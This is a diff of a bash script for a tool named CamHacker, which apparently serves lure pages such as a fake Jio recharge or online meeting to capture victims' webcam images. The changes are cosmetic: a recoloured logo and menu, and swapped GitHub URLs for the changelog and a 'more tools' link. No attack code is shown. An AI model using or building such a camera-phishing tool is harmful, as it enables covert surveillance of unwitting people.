@@ -68,10 +68,13 @@ tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
-${green}  _____           __ _____  _______ _________ 
-${green} / ___/__ ___ _  / // / _ |/ ___/ //_/ __/ _ \
-${green}/ /__/ _ `/  ' \/ _  / __ / /__/ ,< / _// , _/
-${green}\___/\_,_/_/_/_/_//_/_/ |_\___/_/|_/___/_/|_| 
+${green}  ____                _   _            _
+${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
+${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
+${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
+${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
+${red}                                            [v${version}]
+${blue}                                    [By MR-RAFI]
 "
 
 ngrok_help="
@@ -398,7 +401,7 @@ else
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/MR-ZIHAD/CamHacker/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -475,15 +478,15 @@ echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
 
-${green}[${green}1${green}] ${green}JIO RECHARGE
-${green}[${green}2${green}] ${green}FESTIVAL
-${green}[${green}3${green}] ${green}LIVE YOUTUBE
-${green}[${green}4${green}] ${green}ONLINE MEETING
-${green}[${green}d${green}] ${green}CHANGE IMAGE DIRECTORY (current: ${green}${FOL}${green})
-${green}[${green}p${green}] ${green}CHANGE DEFAULT PORT (current: ${green}${PORT}${green})
-${green}[${green}x${green}] ${green}ABOUT
-${green}[${green}m${green}] ${green}MORE TOOLS
-${green}[${green}0${green}] ${green}EXIT${green}
+${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
+${cyan}[${white}2${cyan}] ${yellow}Festival
+${cyan}[${white}3${cyan}] ${yellow}Live Youtube
+${cyan}[${white}4${cyan}] ${yellow}Online Meeting
+${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
+${cyan}[${white}x${cyan}] ${yellow}About
+${cyan}[${white}m${cyan}] ${yellow}More tools
+${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
 "
 sleep 1
 if [ -z $OPTION ]; then
@@ -557,7 +560,7 @@ $red[Email]      ${cyan} :[hossainzihad36@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/MR-ZIHAD#My-Best-Works"
+        xdg-open "https://github.com/MR-ZIHAD/MR-ZIHAD#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
